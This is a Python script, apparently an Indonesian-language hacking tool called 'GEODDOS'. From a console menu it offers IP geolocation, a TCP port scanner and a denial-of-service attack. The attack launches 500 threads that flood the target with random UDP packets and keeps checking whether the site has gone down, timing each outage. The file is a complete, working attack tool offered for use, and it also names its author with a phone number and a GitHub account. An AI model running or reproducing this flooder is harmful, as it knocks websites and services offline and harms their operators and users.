#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import requests
import threading
import urllib3
from urllib.parse import urlparse
from colorama import Fore, init, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
RS = Style.RESET_ALL

TOTAL_PACKETS = 0
FAILED_PACKETS = 0
LOCK = threading.Lock()

AUTHOR_NAME = "ILYASPUTRARAMADHAN"
AUTHOR_WA = "+62895401507076"
AUTHOR_GITHUB = "https://github.com/ZORKYT"

class IPTracker:
    @staticmethod
    def track(ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}").json()
            if response['status'] == 'success':
                print(f"\n{Y}[{W}!{Y}]{C} Alamat IP     {W}: {G}{response['query']}")
                print(f"{Y}[{W}!{Y}]{C} Lokasi        {W}: {G}{response['country']} ({response['countryCode']})")
                print(f"{Y}[{W}!{Y}]{C} Kota          {W}: {G}{response['city']} ({response['regionName']})")
                print(f"{Y}[{W}!{Y}]{C} ISP           {W}: {G}{response['isp']}")
                print(f"{Y}[{W}!{Y}]{C} Koordinat     {W}: {G}{response['lat']}, {response['lon']}")
                print(f"{Y}[{W}!{Y}]{C} Peta          {W}: {G}https://www.google.com/maps/@{response['lat']},{response['lon']},15z")
                print(f"{Y}[{W}!{Y}]{C} ASN           {W}: {G}{response['as']}")
                print(f"{Y}[{W}!{Y}]{C} Zona Waktu    {W}: {G}{response['timezone']}")
                print(f"{Y}[{W}!{Y}]{C} Organisasi    {W}: {G}{response['org']}")
                print(f"{Y}[{W}!{Y}]{C} Status Proxy  {W}: {G}{response['proxy']}")
                print(f"{Y}[{W}!{Y}]{C} Status Hosting{W}: {G}{response['hosting']}")
            else:
                print(f"{R}[!] Gagal melacak IP")
        except Exception as e:
            print(f"{R}[!] Error: {e}")

class PortScanner:
    def __init__(self, ip):
        self.ip = ip

    def scan(self, start_port, end_port):
        print(f"\n{Y}[{W}!{Y}]{C} Memindai port dari {W}{start_port} {C}hingga {W}{end_port}{C} pada {W}{self.ip}{RS}")
        open_ports = []
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        if open_ports:
            print(f"{G}[!] Port terbuka: {', '.join(map(str, open_ports))}{RS}")
        else:
            print(f"{R}[!] Tidak ada port terbuka yang ditemukan dalam rentang ini{RS}")

class DDoSAttack:
    def __init__(self, target):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        self.target = target
        self.parsed_url = urlparse(target)
        self.hostname = self.parsed_url.netloc
        self.ip = self.resolve_ip()
        if self.ip == "UNKNOWN":
            raise ValueError("Gagal resolve IP target")
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.thread_count = 500
        self.running = False
        self.start_time = 0
        self.status_lock = threading.Lock()
        self.site_status = f"{Y}CHECKING...{RS}"
        self.last_status = "UP"
        self.down_start_time = None

    def resolve_ip(self):
        try:
            return socket.gethostbyname(self.hostname)
        except Exception as e:
            print(f"{R}[!] Gagal resolve IP: {e}")
            return "UNKNOWN"
            
    def print_banner(self):
        os.system("clear")
        colors = [R, G, Y, B, C, M, W]
        color = random.choice(colors)
        try:
            os.system(f"figlet -f slant -c 'GEODDOS' | sed 's/\x1b\[35m//g' | sed 's/\x1b\[0m//g' | sed 's/\x1b\[31m//g' | sed 's/\x1b\[34m//g'")
        except:
            print(f"{color}GEODDOS{RS}")
        
        print(f"\n{C}Author    : {W}{AUTHOR_NAME}")
        print(f"{C}WhatsApp  : {W}{AUTHOR_WA}")
        print(f"{C}GitHub    : {W}{AUTHOR_GITHUB}{RS}\n")
        
    def status_check(self):
        while self.running:
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                    'Accept-Language': 'en-US,en;q=0.5'
                }
                response = requests.get(
                    self.target, 
                    headers=headers,
                    timeout=5, 
                    verify=False,
                    allow_redirects=False
                )
                
                with self.status_lock:
                    new_status = "UP" if 200 <= response.status_code < 300 else "DOWN"
                    
                    if new_status != self.last_status:
                        if new_status == "DOWN":
                            self.down_start_time = time.time()
                            print(f"\n\n{R}[!] TARGET DOWN !!!{RS}")
                            print(f"{R}[!] Waktu Down: {time.ctime()}{RS}")
                        else:
                            downtime = time.time() - self.down_start_time
                            print(f"\n\n{G}[!] TARGET UP KEMBALI !!!{RS}")
                            print(f"{G}[!] Durasi Down: {downtime:.2f} detik{RS}")
                        
                        self.last_status = new_status
                        
                    if new_status == "UP":
                        self.site_status = f"{G}UP{RS}"
                    else:
                        self.site_status = f"{R}DOWN ({response.status_code}){RS}"
                        
            except requests.exceptions.ConnectionError:
                with self.status_lock:
                    if self.last_status != "DOWN":
                        print(f"\n\n{R}[!] TARGET DOWN !!!{RS}")
                        print(f"{R}[!] Waktu Down: {time.ctime()}{RS}")
                    self.site_status = f"{R}DOWN (Connection Error){RS}"
                    self.last_status = "DOWN"
            except requests.exceptions.Timeout:
                with self.status_lock:
                    if self.last_status != "DOWN":
                        print(f"\n\n{R}[!] TARGET DOWN !!!{RS}")
                        print(f"{R}[!] Waktu Down: {time.ctime()}{RS}")
                    self.site_status = f"{R}DOWN (Timeout){RS}"
                    self.last_status = "DOWN"
            except Exception as e:
                with self.status_lock:
                    self.site_status = f"{R}ERROR ({str(e)}){RS}"
            
            time.sleep(10)

    def attack_progress(self):
        spinner = ['▁','▂','▃','▄','▅','▆','▇','█']
        i = 0
        while self.running:
            elapsed = time.time() - self.start_time
            with LOCK:
                rps = TOTAL_PACKETS / elapsed if elapsed > 0 else 0
            
            hours, rem = divmod(int(elapsed), 3600)
            minutes, seconds = divmod(rem, 60)
            time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            with self.status_lock:
                current_status = self.site_status
                status_icon = f"{R}" if "DOWN" in current_status else f"{G}"
            
            sys.stdout.write(
                f"\r{Y}[{C}{spinner[i]}{Y}] {W}Memukul {self.hostname} "
                f"{Y}[{status_icon}{C}T:{W}{TOTAL_PACKETS} {Y}|{R} F:{W}{FAILED_PACKETS} "
                f"{Y}|{G} RPS:{W}{rps:.1f} {Y}|{M} Status:{current_status} "
                f"{Y}|{B} Time:{W}{time_str}{Y}] {RS}"
            )
            sys.stdout.flush()
            i = (i + 1) % len(spinner)
            time.sleep(0.1)

    def udp_flood(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                s.sendto(os.urandom(1024), (self.ip, self.port))
                with LOCK:
                    global TOTAL_PACKETS
                    TOTAL_PACKETS += 1
            except Exception as e:
                with LOCK:
                    global FAILED_PACKETS
                    FAILED_PACKETS += 1
                time.sleep(0.01)
        s.close()

    def launch_attack(self):
        global TOTAL_PACKETS, FAILED_PACKETS
        
        self.running = True
        self.start_time = time.time()
        
        print(f"\n{Y}[{W}!{Y}]{C} Memulai serangan ke {W}{self.hostname}")
        print(f"{Y}[{W}!{Y}]{C} IP Target      {W}: {G}{self.ip}")
        print(f"{Y}[{W}!{Y}]{C} Port Target    {W}: {G}{self.port}")
        print(f"{Y}[ {W}!{Y}]{C} Mengaktifkan {W}{self.thread_count} {C}thread penyerang...{RS}")
        time.sleep(1)

        try:
            for _ in range(self.thread_count):
                thread = threading.Thread(target=self.udp_flood)
                thread.daemon = True
                thread.start()
            
            status_thread = threading.Thread(target=self.status_check)
            status_thread.daemon = True
            status_thread.start()
        except Exception as e:
            print(f"{R}[!] Error membuat thread: {e}")
            self.running = False
            return

        progress_thread = threading.Thread(target=self.attack_progress)
        progress_thread.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{R}[!] Serangan dihentikan!{RS}")
            sys.exit(0)

def main_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    attack = DDoSAttack("")
    attack.print_banner()
    
    print(f"{Y}[{W}1{Y}]{C} IP-ATTACK")
    print(f"{Y}[{W}2{Y}]{C} DDOS-ATTACK")
    print(f"{Y}[{W}3{Y}]{C} Port Scan")
    print(f"{Y}[{W}4{Y}]{C} Keluar")
    
    choice = input(f"{Y}[{W}?{Y}]{C} Pilih opsi: ")
    
    if choice == '1':
        ip = input(f"{Y}[{W}?{Y}]{C} Masukkan IP untuk dilacak: ")
        IPTracker.track(ip)
        input(f"{Y}[{W}!{Y}]{C} Tekan Enter untuk kembali ke menu...")
        main_menu()
    elif choice == '2':
        target = input(f"{Y}[{W}?{Y}]{C} Masukkan URL target: ")
        attack = DDoSAttack(target)
        attack.launch_attack()
    elif choice == '3':
        ip = input(f"{Y}[{W}?{Y}]{C} Masukkan IP untuk discan: ")
        start_port = int(input(f"{Y}[{W}?{Y}]{C} Masukkan port awal: "))
        end_port = int(input(f"{Y}[{W}?{Y}]{C} Masukkan port akhir: "))
        scanner = PortScanner(ip)
        scanner.scan(start_port, end_port)
        input(f"{Y}[{W}!{Y}]{C} Tekan Enter untuk kembali ke menu...")
        main_menu()
    elif choice == '4':
        print(f"{Y}[!] Terima kasih telah menggunakan program ini!{RS}")
        print(f"{Y}[!] Author: {AUTHOR_NAME}{RS}")
        print(f"{Y}[!] WA: {AUTHOR_WA}{RS}")
        print(f"{Y}[!] GitHub: {AUTHOR_GITHUB}{RS}")
        sys.exit(0)
    else:
        print(f"{R}[!] Pilihan tidak valid!{RS}")
        input(f"{Y}[{W}!{Y}]{C} Tekan Enter untuk kembali ke menu...")
        main_menu()

if __name__ == "__main__":
    main_menu()